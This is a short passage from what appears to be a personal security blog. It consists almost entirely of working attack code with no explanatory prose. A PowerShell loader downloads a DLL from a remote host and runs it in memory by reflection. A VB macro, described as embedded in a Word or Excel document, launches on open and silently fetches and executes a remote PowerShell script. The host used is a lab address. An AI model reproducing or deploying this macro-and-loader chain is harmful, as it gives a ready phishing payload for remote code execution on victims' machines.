<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadData</span><span class="p">(</span><span class="s1">'http://192.168.119.120/ClassLibrary1.dll'</span><span class="p">)</span><span class="w">
</span><span class="nv">$assem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Assembly</span><span class="p">]::</span><span class="n">Load</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span><span class="w">
</span><span class="nv">$class</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$assem</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s2">"ClassLibrary1.Class1"</span><span class="p">)</span><span class="w">
</span><span class="nv">$method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$class</span><span class="o">.</span><span class="nf">GetMethod</span><span class="p">(</span><span class="s2">"runner"</span><span class="p">)</span><span class="w">
</span><span class="nv">$method</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="bp">$null</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>
<p><br />
<br />
This VB macro would be embeded in the Word/Excel Document</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">MyMacro</span><span class="p">()</span>
<span class="k">Dim</span> <span class="nv">str</span> <span class="ow">As</span> <span class="kt">String</span>
<span class="n">str</span> <span class="o">=</span> <span class="s">"powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"</span>
<span class="n">Shell</span> <span class="n">str</span><span class="p">,</span> <span class="n">vbHide</span>
<span class="k">End</span> <span class="k">Sub</span>
<span class="k">Sub</span> <span class="nf">Document_Open</span><span class="p">()</span>
<span class="n">MyMacro</span>
<span class="k">End</span> <span class="k">Sub</span>
<span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
<span class="n">MyMacro</span>
<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div>


    </main><footer>
  <a href="https://twitter.com/ratilovich">Twitter</a> 
</footer>
</div>
  </body>
</html>
